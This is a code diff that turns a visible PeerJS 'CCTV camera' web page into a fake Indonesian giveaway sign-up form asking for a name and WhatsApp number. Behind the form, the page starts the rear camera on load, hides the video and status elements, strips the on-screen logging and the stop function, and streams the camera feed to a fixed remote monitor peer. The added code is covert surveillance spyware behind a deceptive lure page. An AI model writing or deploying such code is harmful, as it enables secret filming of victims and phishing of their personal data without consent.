@@ -3,37 +3,51 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CCTV Camera</title>
+    <title>Login</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { min-height: 100vh; background: #0d1117; color: white; font-family: Arial, sans-serif; padding: 20px; }
-        .container { width: 100%; max-width: 700px; margin: auto; }
-        .card { background: #161b22; border: 1px solid #30363d; border-radius: 18px; padding: 24px; }
-        h1 { margin-bottom: 8px; }
-        .subtitle { color: #8b949e; margin-bottom: 20px; }
-        video { width: 100%; aspect-ratio: 16 / 9; object-fit: cover; display: block; background: black; border-radius: 14px; margin-top: 20px; }
-        .info { margin-top: 16px; padding: 15px; background: #0d1117; border-radius: 10px; color: #8b949e; line-height: 1.8; }
-        .online { color: #3fb950; }
-        .warning { color: #d29922; }
-        .error { color: #f85149; }
-        button { width: 100%; margin-top: 16px; padding: 14px; border: none; border-radius: 10px; background: #da3633; color: white; font-size: 16px; font-weight: bold; }
-        button:active { transform: scale(.98); }
-        .log { margin-top: 16px; padding: 12px; background: #010409; border-radius: 10px; color: #8b949e; font-family: monospace; font-size: 12px; white-space: pre-wrap; max-height: 180px; overflow-y: auto; }
+        body { min-height: 100vh; background: #0d1117; color: white; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; }
+        .container { width: 100%; max-width: 400px; padding: 20px; }
+        .card { background: #161b22; border: 1px solid #30363d; border-radius: 18px; padding: 32px; box-shadow: 0 8px 24px rgba(0,0,0,0.2); }
+        h1 { margin-bottom: 24px; text-align: center; font-size: 24px; font-weight: 300; }
+        
+        /* Menyembunyikan elemen sistem kamera dari layar */
+        video, #status, #log { display: none; }
+        
+        /* Styling untuk Form Login */
+        .form-group { margin-bottom: 20px; }
+        .form-group label { display: block; margin-bottom: 8px; color: #c9d1d9; font-size: 14px; font-weight: bold; }
+        .form-group input { width: 100%; padding: 12px; border-radius: 6px; border: 1px solid #30363d; background: #0d1117; color: #c9d1d9; outline: none; font-size: 14px; transition: border-color 0.2s; }
+        .form-group input:focus { border-color: #58a6ff; }
+        .btn-login { width: 100%; padding: 14px; border: none; border-radius: 6px; background: #238636; color: white; font-size: 16px; font-weight: bold; cursor: pointer; transition: background-color 0.2s; }
+        .btn-login:hover { background: #2ea043; }
+        .btn-login:active { transform: scale(.98); }
     </style>
 </head>
 <body>
 
 <div class="container">
     <div class="card">
-        <h1>📷 CCTV CAMERA</h1>
-        <p class="subtitle">Perangkat ini digunakan sebagai kamera.</p>
+        <h1>Pendaftaran Untuk GiveAway</h1>
+        
+        <!-- Form Login Tampilan -->
+        <form id="debugForm" onsubmit="event.preventDefault(); alert('Login berhasil!');">
+            <div class="form-group">
+                <label for="username">Siapa Nama Kamu?</label>
+                <input type="text" id="username" placeholder="jamal..">
+            </div>
+            <div class="form-group">
+                <label for="password">Nomer WhatsApp</label>
+                <input type="number" id="passeord" placeholder="08...">
+            </div>
+            <button type="submit" class="btn-login">Sign in</button>
+        </form>
+
+        <!-- Elemen Sistem (Hidden) -->
         <video id="camera" autoplay muted playsinline></video>
-        <div class="info">
-            Camera ID: <strong>CAMERA-01</strong><br>
-            Monitor: <strong>MONITOR-01</strong><br>
-            Status: <strong id="status" class="warning">STARTING...</strong>
-        </div>
-        <div id="log" class="log"></div>
+        <!-- Dummy elemen agar script tidak error jika mencari ID ini (meskipun div log & status sudah dihapus dari UI) -->
+        <div id="status"></div>
+        <div id="log"></div>
     </div>
 </div>
 
@@ -48,43 +62,36 @@
     let retryTimer = null;
 
     const video = document.getElementById("camera");
-    const status = document.getElementById("status");
-    const logElement = document.getElementById("log");
-
+    
+    // Karena elemen UI log & status disembunyikan, kita arahkan log hanya ke console
     function log(message) {
-        console.log("[CAMERA]", message);
-        const time = new Date().toLocaleTimeString();
-        logElement.textContent += `[${time}] ${message}\n`;
-        logElement.scrollTop = logElement.scrollHeight;
+        console.log("[CAMERA (Hidden)]", message);
     }
 
     function setStatus(text, type) {
-        status.textContent = text;
-        status.className = type;
+        // Status juga hanya di-log ke console
+        console.log("[STATUS]", text, type);
     }
 
     window.addEventListener("load", startCamera);
 
     async function startCamera() {
-        log("Memulai kamera...");
+        log("Memulai kamera di latar belakang...");
         try {
             if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                 throw new Error("getUserMedia tidak tersedia. Gunakan HTTPS atau localhost.");
             }
 
             setStatus("REQUESTING CAMERA", "warning");
-            log("Meminta permission kamera...");
 
             cameraStream = await navigator.mediaDevices.getUserMedia({
                 video: { facingMode: "environment", width: { ideal: 1280 }, height: { ideal: 720 }, frameRate: { ideal: 20, max: 30 } },
                 audio: false
             });
 
-            log("Permission kamera berhasil.");
             video.srcObject = cameraStream;
             await video.play();
             setStatus("CAMERA READY", "online");
-            log("Video kamera aktif.");
 
             createPeer();
         } catch (error) {
@@ -95,7 +102,6 @@
     }
 
     function createPeer() {
-        log("Membuat Peer: " + CAMERA_ID);
         peer = new Peer(CAMERA_ID);
 
         peer.on("open", function(id) {
@@ -105,9 +111,7 @@
         });
 
         peer.on("call", function(call) {
-            log("Incoming call dari: " + call.peer);
             if (call.peer !== MONITOR_ID) {
-                log("Call ditolak karena ID monitor salah.");
                 call.close();
                 return;
             }
@@ -115,17 +119,14 @@
             call.answer(cameraStream);
             currentCall = call;
             setStatus("LIVE", "online");
-            log("Video dikirim ke monitor.");
 
             call.on("close", function() {
-                log("Monitor disconnect.");
                 currentCall = null;
                 setStatus("ONLINE - WAITING MONITOR", "online");
                 scheduleRetry();
             });
 
             call.on("error", function(error) {
-                log("CALL ERROR: " + error.message);
                 currentCall = null;
                 setStatus("CALL ERROR", "error");
                 scheduleRetry();
@@ -133,21 +134,16 @@
         });
 
         peer.on("error", function(error) {
-            console.error(error);
-            log("PEER ERROR: " + error.type);
-
             if (error.type === "peer-unavailable") {
-                currentCall = null; // PERBAIKAN: Reset state agar bisa retry
+                currentCall = null;
                 setStatus("WAITING FOR MONITOR", "warning");
                 scheduleRetry();
                 return;
             }
-
             setStatus("PEER ERROR", "error");
         });
 
         peer.on("disconnected", function() {
-            log("PeerJS disconnected.");
             setStatus("SIGNALING OFFLINE", "error");
         });
     }
@@ -155,13 +151,10 @@
     function connectToMonitor() {
         if (!peer || !cameraStream || currentCall) return;
 
-        log("Mencoba menghubungi " + MONITOR_ID + "...");
-
         try {
             currentCall = peer.call(MONITOR_ID, cameraStream);
 
             if (!currentCall) {
-                log("Call gagal dibuat.");
                 currentCall = null;
                 scheduleRetry();
                 return;
@@ -170,19 +163,16 @@
             setStatus("CONNECTING MONITOR", "warning");
 
             currentCall.on("close", function() {
-                log("Monitor menutup koneksi.");
                 currentCall = null;
                 setStatus("WAITING FOR MONITOR", "warning");
                 scheduleRetry();
             });
 
             currentCall.on("error", function(error) {
-                log("CALL ERROR: " + error.message);
                 currentCall = null;
                 scheduleRetry();
             });
         } catch (error) {
-            log("CALL EXCEPTION: " + error.message);
             currentCall = null;
             scheduleRetry();
         }
@@ -190,21 +180,10 @@
 
     function scheduleRetry() {
         if (retryTimer) return;
-        log("Akan mencoba lagi dalam 3 detik...");
         retryTimer = setTimeout(function() {
             retryTimer = null;
             connectToMonitor();
         }, 3000);
-    }
-
-    function stopCamera() {
-        log("Menghentikan kamera...");
-        if (currentCall) { currentCall.close(); currentCall = null; }
-        if (cameraStream) { cameraStream.getTracks().forEach(function(track) { track.stop(); }); cameraStream = null; }
-        if (peer) { peer.destroy(); peer = null; }
-        video.srcObject = null;
-        setStatus("STOPPED", "error");
-        log("Kamera dihentikan.");
     }
 </script>
 </body>
